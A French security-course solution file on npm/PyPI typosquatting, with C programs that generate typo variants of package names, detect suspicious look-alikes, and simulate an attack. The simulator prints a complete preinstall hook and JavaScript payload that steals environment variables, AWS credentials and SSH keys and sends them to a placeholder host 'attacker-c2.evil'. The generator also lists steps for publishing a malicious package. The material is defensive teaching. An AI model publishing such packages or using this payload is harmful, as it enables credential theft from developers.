# Solutions - Typosquatting

## Exercice 1 : Découverte (Très facile)

**Objectif** : Comprendre le concept de typosquatting

**Solution** :

```bash
# Compilation
gcc example.c -o typosquatting

# Exécution
./typosquatting
```

**Résultat attendu** :
```
[*] Module : Typosquatting
[*] ==========================================

[+] Exemple terminé avec succès
```

**Explication** : Introduction au typosquatting de packages - exploitation des fautes de frappe.

---

## Exercice 2 : Générateur de variantes typo (Facile)

**Objectif** : Créer un outil qui génère des variantes typographiques d'un nom de package

**Solution** :

```c
/*
 * Typosquatting Variant Generator
 * Génère toutes les variantes possibles pour typosquatting
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

#define MAX_VARIANTS 1000

// Générer variantes avec caractère manquant
void generate_missing_char(const char* package, char variants[][128], int* count) {
    int len = strlen(package);

    for (int i = 0; i < len; i++) {
        char variant[128];
        int pos = 0;

        for (int j = 0; j < len; j++) {
            if (j != i) {
                variant[pos++] = package[j];
            }
        }
        variant[pos] = '\0';

        // Vérifier que la variante est valide (au moins 2 caractères)
        if (strlen(variant) >= 2) {
            strcpy(variants[*count], variant);
            (*count)++;
        }
    }
}

// Générer variantes avec caractère double
void generate_double_char(const char* package, char variants[][128], int* count) {
    int len = strlen(package);

    for (int i = 0; i < len; i++) {
        char variant[128];
        int pos = 0;

        for (int j = 0; j < len; j++) {
            variant[pos++] = package[j];
            if (j == i) {
                variant[pos++] = package[j];  // Doubler le caractère
            }
        }
        variant[pos] = '\0';

        strcpy(variants[*count], variant);
        (*count)++;
    }
}

// Générer variantes avec caractères inversés
void generate_swapped_chars(const char* package, char variants[][128], int* count) {
    int len = strlen(package);

    for (int i = 0; i < len - 1; i++) {
        char variant[128];
        strcpy(variant, package);

        // Inverser deux caractères adjacents
        char temp = variant[i];
        variant[i] = variant[i + 1];
        variant[i + 1] = temp;

        strcpy(variants[*count], variant);
        (*count)++;
    }
}

// Générer variantes avec homoglyphes
void generate_homoglyphs(const char* package, char variants[][128], int* count) {
    // Remplacements communs
    struct {
        char original;
        char replacement;
    } homoglyphs[] = {
        {'o', '0'}, {'0', 'o'},
        {'l', '1'}, {'1', 'l'},
        {'i', '1'}, {'1', 'i'},
        {'s', '5'}, {'5', 's'},
        {'z', '2'}, {'2', 'z'}
    };

    int num_homoglyphs = sizeof(homoglyphs) / sizeof(homoglyphs[0]);
    int len = strlen(package);

    for (int i = 0; i < len; i++) {
        for (int h = 0; h < num_homoglyphs; h++) {
            if (package[i] == homoglyphs[h].original) {
                char variant[128];
                strcpy(variant, package);
                variant[i] = homoglyphs[h].replacement;

                strcpy(variants[*count], variant);
                (*count)++;
            }
        }
    }
}

// Générer variantes avec caractères manquants de clavier communs
void generate_keyboard_typos(const char* package, char variants[][128], int* count) {
    // Touches adjacentes sur un clavier QWERTY
    const char* neighbors[] = {
        "qw", "we", "er", "rt", "ty", "yu", "ui", "io", "op",
        "as", "sd", "df", "fg", "gh", "hj", "jk", "kl",
        "zx", "xc", "cv", "vb", "bn", "nm"
    };

    int num_neighbors = sizeof(neighbors) / sizeof(neighbors[0]);
    int len = strlen(package);

    for (int i = 0; i < len; i++) {
        for (int n = 0; n < num_neighbors; n++) {
            if (package[i] == neighbors[n][0]) {
                char variant[128];
                strcpy(variant, package);
                variant[i] = neighbors[n][1];

                strcpy(variants[*count], variant);
                (*count)++;
            }
        }
    }
}

// Supprimer les doublons
int remove_duplicates(char variants[][128], int count) {
    int unique_count = 0;

    for (int i = 0; i < count; i++) {
        int is_duplicate = 0;

        for (int j = 0; j < unique_count; j++) {
            if (strcmp(variants[i], variants[j]) == 0) {
                is_duplicate = 1;
                break;
            }
        }

        if (!is_duplicate) {
            if (i != unique_count) {
                strcpy(variants[unique_count], variants[i]);
            }
            unique_count++;
        }
    }

    return unique_count;
}

int main(int argc, char* argv[]) {
    printf("[*] Typosquatting Variant Generator\n");
    printf("[*] ==========================================\n\n");

    const char* package;

    if (argc > 1) {
        package = argv[1];
    } else {
        package = "lodash";  // Package exemple
    }

    printf("[+] Génération des variantes pour: %s\n", package);
    printf("==========================================\n\n");

    char variants[MAX_VARIANTS][128];
    int count = 0;

    // Générer toutes les variantes
    printf("[1/5] Variantes avec caractère manquant...\n");
    generate_missing_char(package, variants, &count);

    printf("[2/5] Variantes avec caractère double...\n");
    generate_double_char(package, variants, &count);

    printf("[3/5] Variantes avec caractères inversés...\n");
    generate_swapped_chars(package, variants, &count);

    printf("[4/5] Variantes avec homoglyphes...\n");
    generate_homoglyphs(package, variants, &count);

    printf("[5/5] Variantes avec typos clavier...\n");
    generate_keyboard_typos(package, variants, &count);

    // Supprimer les doublons
    count = remove_duplicates(variants, count);

    printf("\n[*] Variantes générées: %d\n\n", count);

    // Afficher les variantes par catégorie
    printf("Variantes potentielles pour typosquatting:\n");
    printf("==========================================\n");

    for (int i = 0; i < count && i < 50; i++) {  // Limiter à 50 pour lisibilité
        printf("[%3d] %s\n", i + 1, variants[i]);
    }

    if (count > 50) {
        printf("\n... et %d autres variantes\n", count - 50);
    }

    // Sauvegarder dans un fichier
    char filename[256];
    snprintf(filename, sizeof(filename), "%s_typosquatting.txt", package);

    FILE* f = fopen(filename, "w");
    if (f) {
        fprintf(f, "# Variantes typosquatting pour: %s\n", package);
        fprintf(f, "# Généré automatiquement - %d variantes\n\n", count);

        for (int i = 0; i < count; i++) {
            fprintf(f, "%s\n", variants[i]);
        }

        fclose(f);
        printf("\n[+] Variantes sauvegardées dans: %s\n", filename);
    }

    printf("\n[*] Utilisation offensive:\n");
    printf("==========================================\n");
    printf("1. Choisir une variante populaire (ex: lodsh au lieu de lodash)\n");
    printf("2. Créer un package malveillant\n");
    printf("3. Publier sur npm/PyPI\n");
    printf("4. Attendre qu'un développeur fasse une faute de frappe\n");
    printf("\n\x1b[33m[!] À des fins éducatives uniquement!\x1b[0m\n");

    return 0;
}
```

**Compilation et usage** :
```bash
gcc typo_generator.c -o typo_generator
./typo_generator requests
./typo_generator numpy
```

---

## Exercice 3 : Détecteur de typosquatting (Moyen)

**Objectif** : Créer un outil qui détecte les packages typosquattés dans npm/PyPI

**Solution** :

```c
/*
 * Typosquatting Detector
 * Détecte les packages suspects similaires aux packages populaires
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

// Packages populaires à surveiller
const char* popular_packages[] = {
    "react", "lodash", "express", "axios", "webpack",
    "moment", "jquery", "bootstrap", "vue", "angular",
    "typescript", "eslint", "babel", "redux", "next",
    NULL
};

// Calcul de la distance de Levenshtein
int levenshtein_distance(const char* s1, const char* s2) {
    int len1 = strlen(s1);
    int len2 = strlen(s2);

    int matrix[len1 + 1][len2 + 1];

    for (int i = 0; i <= len1; i++) {
        matrix[i][0] = i;
    }

    for (int j = 0; j <= len2; j++) {
        matrix[0][j] = j;
    }

    for (int i = 1; i <= len1; i++) {
        for (int j = 1; j <= len2; j++) {
            int cost = (s1[i - 1] == s2[j - 1]) ? 0 : 1;

            int deletion = matrix[i - 1][j] + 1;
            int insertion = matrix[i][j - 1] + 1;
            int substitution = matrix[i - 1][j - 1] + cost;

            matrix[i][j] = deletion < insertion ?
                          (deletion < substitution ? deletion : substitution) :
                          (insertion < substitution ? insertion : substitution);
        }
    }

    return matrix[len1][len2];
}

// Vérifier si un package est suspect
int is_suspicious_package(const char* package_name) {
    for (int i = 0; popular_packages[i] != NULL; i++) {
        int distance = levenshtein_distance(package_name, popular_packages[i]);

        // Si distance <= 2, c'est suspect (très similaire)
        if (distance > 0 && distance <= 2) {
            printf("\x1b[31m[!] SUSPECT: %s ressemble à %s (distance: %d)\x1b[0m\n",
                   package_name, popular_packages[i], distance);
            return 1;
        }
    }

    return 0;
}

// Callback CURL
struct MemoryStruct {
    char *memory;
    size_t size;
};

static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;

    char *ptr = realloc(mem->memory, mem->size + realsize + 1);
    if(ptr == NULL) return 0;

    mem->memory = ptr;
    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;

    return realsize;
}

// Rechercher un package sur npm
void search_npm_package(const char* query) {
    CURL *curl;
    CURLcode res;
    struct MemoryStruct chunk;

    chunk.memory = malloc(1);
    chunk.size = 0;

    char url[512];
    snprintf(url, sizeof(url),
             "https://registry.npmjs.org/-/v1/search?text=%s&size=20",
             query);

    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "typosquat-detector/1.0");

        res = curl_easy_perform(curl);

        if(res == CURLE_OK) {
            // Parser les résultats (simplifié)
            char* line = strtok(chunk.memory, "\n");
            while (line != NULL) {
                char* name_start = strstr(line, "\"name\":\"");
                if (name_start) {
                    name_start += 8;
                    char* name_end = strchr(name_start, '"');
                    if (name_end) {
                        char package_name[256];
                        int len = name_end - name_start;
                        strncpy(package_name, name_start, len);
                        package_name[len] = '\0';

                        is_suspicious_package(package_name);
                    }
                }
                line = strtok(NULL, "\n");
            }
        }

        curl_easy_cleanup(curl);
        free(chunk.memory);
    }
}

// Scanner un fichier de packages
void scan_package_list(const char* filename) {
    FILE* f = fopen(filename, "r");
    if (!f) {
        printf("[-] Erreur: Impossible d'ouvrir %s\n", filename);
        return;
    }

    printf("[*] Scan de %s...\n", filename);
    printf("==========================================\n\n");

    char package[256];
    int total = 0;
    int suspicious = 0;

    while (fgets(package, sizeof(package), f)) {
        package[strcspn(package, "\n")] = '\0';  // Retirer \n

        if (strlen(package) > 0) {
            total++;
            if (is_suspicious_package(package)) {
                suspicious++;
            }
        }
    }

    fclose(f);

    printf("\n[*] Résumé:\n");
    printf("Total packages: %d\n", total);
    printf("Suspects: \x1b[31m%d\x1b[0m\n", suspicious);
}

int main(int argc, char* argv[]) {
    printf("[*] Typosquatting Detector\n");
    printf("[*] ==========================================\n\n");

    if (argc > 1) {
        // Mode 1: Scanner un fichier
        if (strcmp(argv[1], "--file") == 0 && argc > 2) {
            scan_package_list(argv[2]);
        }
        // Mode 2: Vérifier un package spécifique
        else {
            printf("[*] Vérification de: %s\n\n", argv[1]);
            if (is_suspicious_package(argv[1])) {
                printf("\n\x1b[31m[!] Ce package est potentiellement typosquatté!\x1b[0m\n");
            } else {
                printf("\n\x1b[32m[+] Package semble légitime\x1b[0m\n");
            }
        }
    } else {
        // Mode 3: Tests automatiques
        printf("[*] Mode test: Vérification de variantes connues\n\n");

        const char* test_packages[] = {
            "reqeusts",   // requests typo
            "loadsh",     // lodash typo
            "expres",     // express typo
            "numpi",      // numpy typo
            "typescritp", // typescript typo
            NULL
        };

        for (int i = 0; test_packages[i] != NULL; i++) {
            is_suspicious_package(test_packages[i]);
        }
    }

    printf("\n[*] Contre-mesures:\n");
    printf("==========================================\n");
    printf("1. Vérifier l'orthographe exacte avant npm install\n");
    printf("2. Utiliser package-lock.json\n");
    printf("3. Vérifier le nombre de téléchargements: npm view <package>\n");
    printf("4. Activer npm audit\n");
    printf("5. Utiliser des outils: npm-audit, snyk\n");

    return 0;
}
```

**Compilation** :
```bash
gcc typo_detector.c -o typo_detector -lcurl
```

**Usage** :
```bash
# Vérifier un package spécifique
./typo_detector "lodsh"

# Scanner un fichier de packages
./typo_detector --file packages.txt
```

**Critères de réussite** :
- Calcul de distance de Levenshtein pour détecter similarité
- Identification de packages suspects
- Comparaison avec liste de packages populaires

---

## Exercice 4 : Simulateur d'attaque complète (Difficile)

**Objectif** : Créer une simulation complète d'attaque typosquatting

**Solution** :

```c
/*
 * Typosquatting Attack Simulator
 * Simulation complète d'une attaque typosquatting
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#define COLOR_RED     "\x1b[31m"
#define COLOR_GREEN   "\x1b[32m"
#define COLOR_YELLOW  "\x1b[33m"
#define COLOR_BLUE    "\x1b[34m"
#define COLOR_MAGENTA "\x1b[35m"
#define COLOR_RESET   "\x1b[0m"

// Simuler les statistiques d'un package
typedef struct {
    char name[128];
    int downloads_per_week;
    char version[32];
    int is_malicious;
} PackageStats;

// Simuler le processus de création d'un package malveillant
void simulate_malicious_package_creation(const char* original, const char* typo) {
    printf("\n%s╔════════════════════════════════════════════════════╗%s\n",
           COLOR_RED, COLOR_RESET);
    printf("%s║   PHASE 1: Création du package malveillant        ║%s\n",
           COLOR_RED, COLOR_RESET);
    printf("%s╚════════════════════════════════════════════════════╝%s\n\n",
           COLOR_RED, COLOR_RESET);

    printf("[*] Package original: %s\n", original);
    printf("[*] Package typosquatté: %s\n", typo);

    printf("\n[+] Création de la structure du package...\n");
    sleep(1);

    // Simuler package.json
    printf("\n--- package.json ---\n");
    printf("{\n");
    printf("  \"name\": \"%s\",\n", typo);
    printf("  \"version\": \"1.0.0\",\n");
    printf("  \"description\": \"Similar to %s\",\n", original);
    printf("  \"scripts\": {\n");
    printf("    %s\"preinstall\": \"node malicious.js\"%s\n", COLOR_RED, COLOR_RESET);
    printf("  }\n");
    printf("}\n");

    printf("\n[+] Création du payload malveillant...\n");
    sleep(1);

    printf("\n--- malicious.js ---\n");
    printf("%s", COLOR_RED);
    printf("const os = require('os');\n");
    printf("const https = require('https');\n");
    printf("const fs = require('fs');\n\n");

    printf("// Collecte d'informations sensibles\n");
    printf("const data = {\n");
    printf("  hostname: os.hostname(),\n");
    printf("  user: os.userInfo().username,\n");
    printf("  platform: os.platform(),\n");
    printf("  cwd: process.cwd(),\n");
    printf("  env: process.env,\n");
    printf("  timestamp: new Date().toISOString()\n");
    printf("};\n\n");

    printf("// Recherche de fichiers sensibles\n");
    printf("const sensitiveFiles = [\n");
    printf("  '.env',\n");
    printf("  '.aws/credentials',\n");
    printf("  '.ssh/id_rsa',\n");
    printf("  'config.json'\n");
    printf("];\n\n");

    printf("sensitiveFiles.forEach(file => {\n");
    printf("  const path = require('path').join(os.homedir(), file);\n");
    printf("  if (fs.existsSync(path)) {\n");
    printf("    data[file] = fs.readFileSync(path, 'utf8');\n");
    printf("  }\n");
    printf("});\n\n");

    printf("// Exfiltration vers serveur C2\n");
    printf("const req = https.request({\n");
    printf("  hostname: 'attacker-c2.evil',\n");
    printf("  port: 443,\n");
    printf("  path: '/exfil',\n");
    printf("  method: 'POST',\n");
    printf("  headers: {'Content-Type': 'application/json'}\n");
    printf("}, (res) => {\n");
    printf("  console.log('Installation complete!');\n");
    printf("});\n\n");

    printf("req.write(JSON.stringify(data));\n");
    printf("req.end();\n");
    printf("%s", COLOR_RESET);

    printf("\n[+] Package malveillant créé!\n");
}

// Simuler la publication sur npm
void simulate_npm_publish(const char* package) {
    printf("\n%s╔════════════════════════════════════════════════════╗%s\n",
           COLOR_YELLOW, COLOR_RESET);
    printf("%s║   PHASE 2: Publication sur npm                     ║%s\n",
           COLOR_YELLOW, COLOR_RESET);
    printf("%s╚════════════════════════════════════════════════════╝%s\n\n",
           COLOR_YELLOW, COLOR_RESET);

    printf("[*] Connexion à registry.npmjs.org...\n");
    sleep(1);
    printf("[+] Authentification réussie\n\n");

    printf("[*] Publication de %s...\n", package);
    sleep(1);

    printf("npm notice \n");
    printf("npm notice 📦  %s@1.0.0\n", package);
    printf("npm notice === Tarball Contents ===\n");
    printf("npm notice 423B package.json\n");
    printf("npm notice 1.2kB malicious.js\n");
    printf("npm notice 512B README.md\n");
    printf("npm notice === Tarball Details ===\n");
    printf("npm notice name:          %s\n", package);
    printf("npm notice version:       1.0.0\n");
    printf("npm notice total files:   3\n");
    printf("npm notice \n");

    printf("%s+ %s@1.0.0%s\n", COLOR_GREEN, package, COLOR_RESET);
    printf("\n[+] Package publié avec succès!\n");
    printf("[+] Accessible à: https://www.npmjs.com/package/%s\n", package);
}

// Simuler une victime qui installe le package
void simulate_victim_install(const char* package, int* victims) {
    printf("\n%s╔════════════════════════════════════════════════════╗%s\n",
           COLOR_MAGENTA, COLOR_RESET);
    printf("%s║   PHASE 3: Installation par la victime            ║%s\n",
           COLOR_MAGENTA, COLOR_RESET);
    printf("%s╚════════════════════════════════════════════════════╝%s\n\n",
           COLOR_MAGENTA, COLOR_RESET);

    printf("%s[Victime]%s Développeur tape: npm install %s\n",
           COLOR_BLUE, COLOR_RESET, package);
    printf("%s[Victime]%s (faute de frappe non remarquée)\n\n",
           COLOR_BLUE, COLOR_RESET);

    sleep(1);

    printf("npm WARN deprecated request@2.88.2: deprecated\n");
    printf("npm WARN installing %s...\n", package);

    printf("\n%s> %s@1.0.0 preinstall%s\n", COLOR_RED, package, COLOR_RESET);
    printf("%s> node malicious.js%s\n\n", COLOR_RED, COLOR_RESET);

    sleep(1);

    printf("%s[!] EXÉCUTION DU PAYLOAD MALVEILLANT!%s\n", COLOR_RED, COLOR_RESET);
    printf("%s[!] Collecte des informations système...%s\n", COLOR_RED, COLOR_RESET);
    printf("%s[!] Recherche de fichiers sensibles...%s\n", COLOR_RED, COLOR_RESET);
    printf("%s[!] Exfiltration vers attacker-c2.evil...%s\n", COLOR_RED, COLOR_RESET);

    sleep(1);

    printf("\nInstallation complete!\n");
    printf("\nadded 1 package in 2.1s\n");

    (*victims)++;

    printf("\n%s[Attaquant]%s Nouvelle victime! Total: %d\n",
           COLOR_GREEN, COLOR_RESET, *victims);
}

// Générer des statistiques d'attaque
void generate_attack_stats(const char* package, int victims, int days) {
    printf("\n%s╔════════════════════════════════════════════════════╗%s\n",
           COLOR_BLUE, COLOR_RESET);
    printf("%s║   STATISTIQUES DE L'ATTAQUE                        ║%s\n",
           COLOR_BLUE, COLOR_RESET);
    printf("%s╚════════════════════════════════════════════════════╝%s\n\n",
           COLOR_BLUE, COLOR_RESET);

    printf("Package: %s\n", package);
    printf("Durée: %d jours\n", days);
    printf("Victimes: %s%d%s\n", COLOR_RED, victims, COLOR_RESET);
    printf("Moyenne: %.1f victimes/jour\n", (float)victims / days);

    printf("\nDonnées exfiltrées:\n");
    printf("  - %d ensembles de credentials AWS\n", victims * 2 / 3);
    printf("  - %d fichiers .env\n", victims * 4 / 5);
    printf("  - %d clés SSH privées\n", victims / 2);
    printf("  - %d tokens GitHub\n", victims * 3 / 4);

    printf("\n%sImpact financier estimé: $%d%s\n",
           COLOR_RED, victims * 5000, COLOR_RESET);
}

int main(int argc, char* argv[]) {
    srand(time(NULL));

    printf("%s", COLOR_BLUE);
    printf("╔══════════════════════════════════════════════════════╗\n");
    printf("║                                                      ║\n");
    printf("║    TYPOSQUATTING ATTACK SIMULATOR                   ║\n");
    printf("║                                                      ║\n");
    printf("║    Démonstration à des fins éducatives              ║\n");
    printf("║                                                      ║\n");
    printf("╚══════════════════════════════════════════════════════╝\n");
    printf("%s\n", COLOR_RESET);

    printf("%s[!] AVERTISSEMENT:%s Cette simulation démontre une attaque réelle\n",
           COLOR_YELLOW, COLOR_RESET);
    printf("%s[!]%s Ne jamais publier de packages malveillants sur npm/PyPI\n",
           COLOR_YELLOW, COLOR_RESET);
    printf("%s[!]%s À des fins éducatives et de recherche uniquement\n\n",
           COLOR_YELLOW, COLOR_RESET);

    printf("Appuyez sur Entrée pour continuer...");
    getchar();

    // Scénario
    const char* original = "requests";
    const char* typo = "reqeusts";

    // Phase 1: Création
    simulate_malicious_package_creation(original, typo);

    printf("\n\nAppuyez sur Entrée pour continuer...");
    getchar();

    // Phase 2: Publication
    simulate_npm_publish(typo);

    printf("\n\nAppuyez sur Entrée pour continuer...");
    getchar();

    // Phase 3: Victimes multiples
    int victims = 0;
    int num_installs = 3 + (rand() % 5);

    for (int i = 0; i < num_installs; i++) {
        simulate_victim_install(typo, &victims);

        if (i < num_installs - 1) {
            printf("\n\n--- %d jours plus tard ---\n", 1 + (rand() % 7));
            sleep(2);
        }
    }

    // Statistiques finales
    printf("\n\nAppuyez sur Entrée pour voir les statistiques...");
    getchar();

    generate_attack_stats(typo, victims, 30);

    // Mitigation
    printf("\n%s╔════════════════════════════════════════════════════╗%s\n",
           COLOR_GREEN, COLOR_RESET);
    printf("%s║   CONTRE-MESURES                                   ║%s\n",
           COLOR_GREEN, COLOR_RESET);
    printf("%s╚════════════════════════════════════════════════════╝%s\n\n",
           COLOR_GREEN, COLOR_RESET);

    printf("Côté utilisateur:\n");
    printf("  1. Vérifier orthographe exacte\n");
    printf("  2. Utiliser autocomplétion\n");
    printf("  3. Vérifier downloads: npm view <package>\n");
    printf("  4. Lire package.json avant installation\n");
    printf("  5. Utiliser package-lock.json\n\n");

    printf("Côté npm/PyPI:\n");
    printf("  1. Similarity detection\n");
    printf("  2. Analyse statique des install scripts\n");
    printf("  3. Reputation scoring\n");
    printf("  4. Blocage de patterns suspects\n");
    printf("  5. Verification two-factor pour publishers\n\n");

    printf("Côté entreprise:\n");
    printf("  1. Private registry\n");
    printf("  2. Proxy avec whitelist\n");
    printf("  3. Audit régulier des dépendances\n");
    printf("  4. Formation des développeurs\n");
    printf("  5. CI/CD security scanning\n");

    return 0;
}
```

**Compilation et exécution** :
```bash
gcc typo_attack_sim.c -o typo_attack_sim
./typo_attack_sim
```

**Bonus - Outil de protection** :

```bash
#!/bin/bash
# Typosquatting Protection Script

POPULAR_PACKAGES="react lodash express axios webpack moment jquery"

echo "[*] Typosquatting Protection"
echo "=========================================="

# Vérifier package.json
if [ ! -f "package.json" ]; then
    echo "[-] package.json not found"
    exit 1
fi

echo "[+] Analysing dependencies..."

# Extraire les noms de packages
packages=$(grep -oP '"\K[^"]+(?=":)' package.json | grep -v "^@")

for pkg in $packages; do
    # Vérifier nombre de downloads
    downloads=$(npm view "$pkg" dist.downloads 2>/dev/null)

    if [ -z "$downloads" ]; then
        echo "[!] WARNING: $pkg - Package non trouvé!"
    elif [ "$downloads" -lt 1000 ]; then
        echo "[!] WARNING: $pkg - Peu de downloads ($downloads)"
    else
        echo "[+] OK: $pkg ($downloads downloads)"
    fi
done

echo ""
echo "[+] Protection terminée"
```

---

## Auto-évaluation

Avant de passer au module suivant, vérifiez que vous pouvez :
- [ ] Expliquer le principe du typosquatting
- [ ] Générer des variantes typographiques d'un nom de package
- [ ] Détecter des packages typosquattés avec distance de Levenshtein
- [ ] Comprendre l'impact d'une attaque (exfiltration de données)
- [ ] Mettre en place des contre-mesures

## Notes importantes

- **Cas réels** : crossenv (2017), event-stream (2018), nombreux packages Python
- **Impact** : Exfiltration credentials, backdoors, cryptominers
- **Prévention** : Vérification orthographe, package-lock.json, npm audit
- **Légal** : Publier un package typosquatté est ILLÉGAL
